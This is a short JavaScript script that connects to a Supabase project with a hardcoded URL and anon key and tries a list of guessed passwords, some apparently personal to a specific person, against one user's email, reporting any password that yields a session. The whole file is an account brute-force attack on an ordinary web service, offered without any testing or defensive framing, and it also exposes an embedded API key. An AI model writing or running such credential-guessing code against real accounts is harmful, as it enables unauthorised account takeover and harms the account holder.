import { createClient } from '@supabase/supabase-js';

const supabaseUrl = 'https://dddsplxihciighvmaqqt.supabase.co';
const supabaseAnonKey = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImRkZHNwbHhpaGNpaWdodm1hcXF0Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3ODk3MzkwMjMsImV4cCI6MjEwNTMxNTAyM30.pnsb2zejuaHkauMMM0d6otRofPxMtx-K0-1iMvWeyJ8';

const supabase = createClient(supabaseUrl, supabaseAnonKey);

const userEmail = 'c9e8b6e9-745b-4f79-9271-6eeb1eb99d0d@users.arcade-vault.invalid';
const candidates = ['2048', '1234', '123456', '0000', 'password', 'Secret123!', 'hemu123', 'admin', 'vault123', 'hemendra1315'];

console.log('Testing signin passwords for user email:', userEmail);
for (const pw of candidates) {
  const { data, error } = await supabase.auth.signInWithPassword({
    email: userEmail,
    password: pw,
  });
  if (data?.session) {
    console.log(`🎉 SUCCESS! Password is: "${pw}"`);
    process.exit(0);
  }
}
console.log('Finished testing candidate list.');
